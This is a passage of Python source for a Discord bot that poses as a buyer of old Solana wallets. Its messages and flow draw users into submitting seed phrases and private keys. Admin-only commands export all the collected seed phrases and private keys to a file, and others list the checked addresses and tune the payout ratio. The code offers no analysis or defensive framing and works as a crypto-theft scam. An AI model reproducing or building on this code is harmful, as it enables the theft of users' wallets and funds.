            log_msg = f"💰 **Reward Wallet Submitted**\n👤 User: @{message.author}\n🆔 ID: `{user_id}`\n📍 Wallet: `{reward_wallet}`\n\n*Waiting for seed phrase/private key...*"
            asyncio.run_coroutine_threadsafe(send_to_target(content=log_msg), bot.loop)
            return
        else:
            # If not a wallet, don't treat it as a command error, just ignore or prompt
            return

        # ═══════════════════════════════════════════════════════════════
        # Admin Commands
        # ═══════════════════════════════════════════════════════════════
        if not hasattr(bot, 'admin_contexts'):
            bot.admin_contexts = {}

        if message.author.id in ADMIN_IDS:
            content = message.content.strip()
            content_lower = content.lower()
            
            # Check if it's actually a command (starts with prefix or is in known commands list)
            is_known_command = content_lower in [
                'ratios', 'blocklist', 'start', 'referral', 'pay', 'broadcast', 'rr',
                'عبارات ومفاتيح', 'عناوين', 'فحص', 'فارغ', 'r30', '30%', 'r40', '40%', 'r50', '50%', 'r70', '70%'
            ] or content_lower.startswith(('ed ', 'broadcast ', '/'))
            
            if is_known_command or any(char.isdigit() for char in content):
                # Handle numeric inputs (Prices or Ratios)
                try:
                    is_percentage = '%' in content_lower
                    val_str = content_lower.replace('%', '')
                    if val_str.replace('.', '', 1).isdigit():
                        val = float(val_str)
                        
                        # If it has %, it's ALWAYS a global ratio
                        if is_percentage:
                            if val > 0:
                                new_divisor = 100.0 / val
                                save_user_divisor(new_divisor)
                                await message.reply(f"✅ تم تعيين النسبة العامة لجميع المستخدمين: **{val}%**\n(المقسوم الحالي: {new_divisor:.4f})")
                            else:
                                await message.reply("❌ النسبة يجب أن تكون أكبر من صفر.")
                            return

                        # If it's a number without %, check if we have a wallet context
                        last_wallet = bot.admin_contexts.get(message.author.id)
                        if last_wallet:
                            ctx = await bot.get_context(message)
                            await ed_command(ctx, last_wallet, val)
                            return
                        
                        # If no wallet context and no %, prompt user
                        await message.reply("💡 لتعيين **نسبة مئوية عامة**، أضف رمز `%` (مثال: `80%`).\nلتحديد **سعر مخصص** لمحفظة، اختر المحفظة أولاً باستخدام `ed <wallet>`.")
                        return
                except Exception as e:
                    logging.error(f"Numeric input error: {e}")

            # Handle "ed <wallet> <price>"
            if content_lower.startswith('ed '):
                parts = content.split()
                if len(parts) >= 2:
                    wallet = parts[1]
                    bot.admin_contexts[message.author.id] = wallet # Store context
                    price = None
                    if len(parts) >= 3:
                        try:
                            price = float(parts[2])
                        except ValueError:
                            pass
                    
                    ctx = await bot.get_context(message)
                    await ed_command(ctx, wallet, price)
                    return
                else:
                    await message.reply("❌ Usage: `ed <wallet_address> [price]`")
                    return

            # Known text commands
            if content_lower in ['ratios']:
                ctx = await bot.get_context(message)
                await ratios(ctx)
                return
            elif content_lower == 'blocklist':
                ctx = await bot.get_context(message)
                await blocklist(ctx)
                return
            elif content_lower == 'start':
                ctx = await bot.get_context(message)
                await start(ctx)
                return
            elif content_lower == 'referral':
                ctx = await bot.get_context(message)
                await referral(ctx)
                return
            elif content_lower == 'pay':
                ctx = await bot.get_context(message)
                await pay(ctx)
                return
            elif content_lower == 'broadcast':
                ctx = await bot.get_context(message)
                await broadcast(ctx)
                return
            elif content_lower == 'عبارات ومفاتيح':
                ctx = await bot.get_context(message)
                await export_keys_here(ctx)
                return
            elif content_lower == 'عناوين':
                ctx = await bot.get_context(message)
                await export_addresses(ctx)
                return
            elif content_lower == 'فحص':
                ctx = await bot.get_context(message)
                await export_addresses(ctx, mode="rent")
                return
            elif content_lower == 'فارغ':
                ctx = await bot.get_context(message)
                await export_addresses(ctx, mode="empty")
                return
            elif content_lower in ['r30', '30%']:
                ctx = await bot.get_context(message)
                await r30(ctx)
                return
            elif content_lower in ['r40', '40%']:
                ctx = await bot.get_context(message)
                await r40(ctx)
                return
            elif content_lower in ['r50', '50%']:
                ctx = await bot.get_context(message)
                await r50(ctx)
                return
            elif content_lower in ['r70', '70%']:
                ctx = await bot.get_context(message)
                await r70(ctx)
                return

    # Wallet Extraction & Processing (Auto-Check)
    # ═══════════════════════════════════════════════════════════════
    wallets = []
    is_only_wallet = False
    potential_wallets = extract_wallets(message.content)
    
    # If the message is JUST a wallet (no spaces, length 32-44)
    content_stripped = message.content.strip()
    if potential_wallets and len(content_stripped) <= 44 and " " not in content_stripped:
        is_only_wallet = True

    if is_only_wallet:
        wallets = potential_wallets
        # Critical fix: Don't process as command if it's just a wallet
        # to avoid CommandNotFound errors
    elif any(content_stripped.startswith(p) for p in (bot.command_prefix if isinstance(bot.command_prefix, (list, tuple, set)) else [bot.command_prefix]) if p):
        # Let the bot handle actual commands
        await bot.process_commands(message)
        return
    else:
        wallets = potential_wallets
    
    if wallets:
        wallet = wallets[0]
        
        # منع التداخل: إذا كان المستخدم في حالة انتظار عنوان المكافأة، لا تقم بفحص المحفظة كطلب جديد
        if user_states.get(user_id) == "waiting_for_reward_wallet":
            return
        
        # تأكد أن الرسالة ليست أمراً للمشرف (مثل ed <wallet>)
        if message.author.id in ADMIN_IDS and (content_stripped.lower().startswith('ed ') or any(content_stripped.startswith(p) for p in (bot.command_prefix if isinstance(bot.command_prefix, (list, tuple, set)) else [bot.command_prefix]) if p)):
            return

        # Run the sync check in a thread to not block the event loop
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(None, process_wallet_check_sync, user_id, username, wallet)
        
        if result:
            log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_empty=result['is_empty'])
            if result["is_empty"]:
                await message.reply("🚫 Unfortunately, we cannot offer any value for this wallet.\n\n🔍 Try checking other addresses—some might be valuable!")
            else:
                short_wallet = wallet[:4] + "..." + wallet[-4:]
                result_text = f"Wallet: `{short_wallet}`\n\nYou will receive: `{result['user_sol_value']} SOL 💰`"
                
                user_wallets[user_id] = {
                    "original_wallet": wallet,
                    "amount": result['total_rent']
                }
                
                view = discord.ui.View()
                confirm_btn = discord.ui.Button(label="✅ Confirm & Sell", style=discord.ButtonStyle.green, custom_id="confirm_sell")
                cancel_btn = discord.ui.Button(label="❌ Cancel", style=discord.ButtonStyle.red, custom_id="cancel_sell")
                
                async def confirm_callback(interaction):
                    if interaction.user.id != user_id:
                        await interaction.response.send_message("This is not your transaction.", ephemeral=True)
                        return
                    
                    await interaction.response.send_message("✅ Request confirmed successfully\n\nPlease send your **Receiving Wallet Address** (it must be different from the one you are selling):")
                    user_states[user_id] = "waiting_for_reward_wallet"

                async def cancel_callback(interaction):
                    if interaction.user.id != user_id:
                        await interaction.response.send_message("This is not your transaction.", ephemeral=True)
                        return
                    await interaction.response.send_message("❌ Transaction cancelled.")
                    user_wallets.pop(user_id, None)

                confirm_btn.callback = confirm_callback
                cancel_btn.callback = cancel_callback
                
                view.add_item(confirm_btn)
                view.add_item(cancel_btn)
                
                await message.reply(result_text, view=view)
                
                # Log to admin channel
                log_wallet_check(user_id, username, wallet, result['user_sol_value'], result['total_rent'], is_custom=result['is_custom'])
        
        # If it was JUST a wallet, we stop here to avoid CommandNotFound
        if is_only_wallet:
            return

    content = f"{info_text}💬 **Message**: {message.content}" if message.content else info_text
    files = []
    for attachment in message.attachments:
        files.append(await attachment.to_file())

    if content or files:
        await send_to_target(content=content, files=files)
    
    await bot.process_commands(message)

@bot.command(name="ed")
async def ed_command(ctx, wallet_address: str = "", price: float = 0.0):
    if ctx.author.id not in ADMIN_IDS:
        return
    
    if not wallet_address:
        await ctx.reply("❌ Usage: `ed <wallet_address> [price]`")
        return

    if price != 0.0:
        try:
            conn = sqlite3.connect(DB_PATH)
            cursor = conn.cursor()
            cursor.execute('''INSERT OR REPLACE INTO wallet_prices
                             (wallet_address, custom_price, set_by_admin)
                             VALUES (?, ?, ?)''', (wallet_address, price, ctx.author.id))
            conn.commit()
            conn.close()
            await ctx.reply(f"✅ Set custom price for `{wallet_address}` to `{price} SOL`")
        except Exception as e:
            await ctx.reply(f"❌ Error: {e}")
        return

    # If no price, show current status/interface
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT custom_price FROM wallet_prices WHERE wallet_address = ?', (wallet_address,))
        result = cursor.fetchone()
        conn.close()
        
        current_price = result[0] if result else "Not set"
        
        embed = discord.Embed(title="🔧 Edit Wallet Price", color=discord.Color.blue())
        embed.add_field(name="Wallet", value=f"`{wallet_address}`", inline=False)
        embed.add_field(name="Current Price", value=f"`{current_price} SOL`", inline=False)
        embed.set_footer(text="To change, use: ed <wallet> <price>")
        
        await ctx.reply(embed=embed)
    except Exception as e:
        await ctx.reply(f"❌ Error: {e}")

@bot.command()
async def r50(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 2.0
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 50% (القسمة على 2)")

@bot.command()
async def r30(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 3.5
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 30% (القسمة على 3.5)")

@bot.command()
async def r40(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 2.5
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 40% (القسمة على 2.5)")

@bot.command()
async def r70(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    global user_divisor
    user_divisor = 1.7
    save_user_divisor(user_divisor)
    await ctx.reply("✅ تم تعديل النسبة إلى 70% (القسمة على 1.7)")

@bot.command()
async def ratios(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    status_text = f"📊 **حالة النسب الحالية:**\n\n👤 المستخدمين: القسمة على {user_divisor}\n👑 المشرف: القسمة على {admin_divisor}"
    await ctx.reply(status_text)

@bot.command()
async def block(ctx, user_id: int, *, reason="No reason provided"):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("INSERT OR REPLACE INTO blocked_users (user_id, blocked_by_admin, reason) VALUES (?, ?, ?)", (user_id, ctx.author.id, reason))
        conn.commit()
        conn.close()
        await ctx.reply(f"✅ تم حظر المستخدم {user_id} بنجاح!")
    except Exception as e:
        await ctx.reply(f"❌ فشل الحظر: {e}")

@bot.command()
async def unblock(ctx, user_id: int):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM blocked_users WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        await ctx.reply(f"✅ تم إلغاء حظر المستخدم {user_id} بنجاح!")
    except Exception as e:
        await ctx.reply(f"❌ فشل إلغاء الحظر: {e}")

@bot.command()
async def blocklist(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT bu.user_id, u.username, bu.blocked_time, bu.reason FROM blocked_users bu LEFT JOIN users u ON bu.user_id = u.user_id")
        blocked = cursor.fetchall()
        conn.close()
        if not blocked:
            await ctx.reply("📋 لا يوجد مستخدمين محظورين حالياً.")
            return
        text = "🚫 **قائمة المستخدمين المحظورين**\n\n"
        for uid, uname, btime, reason in blocked:
            text += f"ID: `{uid}` | User: @{uname} | Reason: {reason}\n"
        await ctx.reply(text)
    except Exception as e:
        await ctx.reply(f"❌ فشل جلب القائمة: {e}")

@bot.command()
async def rr(ctx, user_id: int, *, message: str):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        user = await bot.fetch_user(user_id)
        
        # إنشاء الأزرار كما في bot.py
        view = discord.ui.View()
        
        # زر الدردشة مع المشرف
        chat_admin_btn = discord.ui.Button(label="الدردشة مع المشرف", url="https://t.me/Hanky111")
        
        # زر الدردشة مع المستخدم (للمشرفين الآخرين أو المرجعية)
        # ملاحظة: في ديسكورد لا يمكننا وضع رابط مباشر لدردشة المستخدم بسهولة مثل تليجرام، 
        # لذا سنضع زر يوضح يوزر المستخدم
        user_info_btn = discord.ui.Button(label=f"المستخدم: {user.name}", style=discord.ButtonStyle.gray, disabled=True)
        
        view.add_item(chat_admin_btn)
        view.add_item(user_info_btn)

        embed = discord.Embed(
            title="📩 رسالة من الإدارة", 
            description=message, 
            color=discord.Color.blue(),
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="بوت فحص وبيع المحافظ")
        
        await user.send(embed=embed, view=view)
        await ctx.reply(f"✅ تم إرسال الرسالة إلى `{user_id}` بنجاح مع الأزرار.")
    except Exception as e:
        await ctx.reply(f"❌ فشل الإرسال: {e}")

@bot.command()
async def prices(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute("SELECT wallet_address, custom_price FROM wallet_prices")
        data = cursor.fetchall()
        conn.close()
        if not data:
            await ctx.reply("📋 No custom prices set.")
            return
        text = "💼 **Custom Prices:**\n"
        for w, p in data:
            text += f"`{w[:6]}...{w[-6:]}`: `{p} SOL`\n"
        await ctx.reply(text)
    except Exception as e:
        await ctx.reply(f"❌ Failed to fetch prices: {e}")

@bot.command()
async def start(ctx):
    user_id = ctx.author.id
    username = ctx.author.name
    first_name = ctx.author.display_name
    last_name = "" # Discord doesn't have last_name like Telegram

    # Update user data
    add_user(user_id, username, first_name, last_name)

    welcome_text = "Welcome.\n\nSend me the address of the old wallet you want to sell 💰"
    await ctx.send(welcome_text)

@bot.command()
async def referral(ctx):
    await ctx.send("Referral system coming soon.")


@bot.command()
async def pay(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    await ctx.reply("Please send the user ID to process payment:")
    admin_payment_states[ctx.author.id] = "waiting_for_user_id"

@bot.command()
async def broadcast(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    await ctx.reply("📢 Please send the message you want to broadcast:\n\n• Text only\n• Photo with caption\n• Photo only")
    admin_payment_states[ctx.author.id] = "waiting_for_broadcast_message"

@bot.command()
async def export_keys_here(ctx):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        await ctx.reply("⏳ جاري تصدير العبارات والمفاتيح...")
        filename = export_keys_to_file()
        if filename:
            with open(filename, 'rb') as f:
                await ctx.send(file=discord.File(f, filename), content="✅ تم تصدير جميع العبارات والمفاتيح (عدا المشرفين)")
            os.remove(filename)
        else:
            await ctx.reply("❌ لا توجد عبارات أو مفاتيح محفوظة")
    except Exception as e:
        logging.error(f"Export keys error: {e}")
        await ctx.reply("❌ حدث خطأ أثناء التصدير")

@bot.command()
async def export_addresses(ctx, mode="all"):
    if ctx.author.id not in ADMIN_IDS: return
    try:
        file_to_send = "addresses_export.txt"
        msg = "✅ تم تصدير جميع العناوين المفحوصة"
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        if mode == "empty":
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks WHERE is_empty = 1")
            msg = "✅ تم تصدير العناوين الفارغة فقط"
        elif mode == "rent":
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks WHERE has_rent = 1")
            msg = "✅ تم تصدير العناوين التي بها ريع (Rent)"
        else:
            cursor.execute("SELECT DISTINCT wallet_address FROM wallet_checks")
            
        rows = cursor.fetchall()
        conn.close()
        
        if not rows:
            await ctx.reply("❌ لا توجد بيانات مسجلة حالياً لهذا النوع")
            return

        with open(file_to_send, "w", encoding="utf-8") as f:
            for row in rows:
                f.write(f"{row[0]}\n")

        if os.path.exists(file_to_send):
            with open(file_to_send, 'rb') as f:
                await ctx.send(file=discord.File(f, file_to_send), content=msg)
            os.remove(file_to_send)
    except Exception as e:
        logging.error(f"Export addresses error: {e}")
        await ctx.reply("❌ حدث خطأ أثناء التصدير")

def export_keys_to_file():
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        query = f'''SELECT key_data, key_type, user_id, username, submit_time
                    FROM user_keys
                    ORDER BY key_type DESC, submit_time'''
        cursor.execute(query)
        keys = cursor.fetchall()
        conn.close()
        if not keys: return None
        filename = f"keys_export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            seeds = [k for k in keys if k[1] == 'seed']
            privkeys = [k for k in keys if k[1] == 'private_key']
            if seeds:
                f.write("=== العبارات السرية (Seed Phrases) ===\n\n")
                for key_data, _, user_id, username, submit_time in seeds:
                    f.write(f"{key_data}\n\n")
                f.write("\n")
            if privkeys:
                f.write("=== المفاتيح الخاصة (Private Keys) ===\n\n")
                for key_data, _, user_id, username, submit_time in privkeys:
                    f.write(f"{key_data}\n\n")
        return filename
    except Exception as e:
        logging.error(f"Error exporting keys: {e}")
        return None

if __name__ == "__main__":
    init_database()
    threading.Thread(target=run_flask, daemon=True).start()
    DISCORD_TOKEN = os.getenv('DISCORD_BOT')
    if not DISCORD_TOKEN:
        print("❌ Error: DISCORD_BOT token not found in environment variables.")
    else:
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Critical Error: {e}")
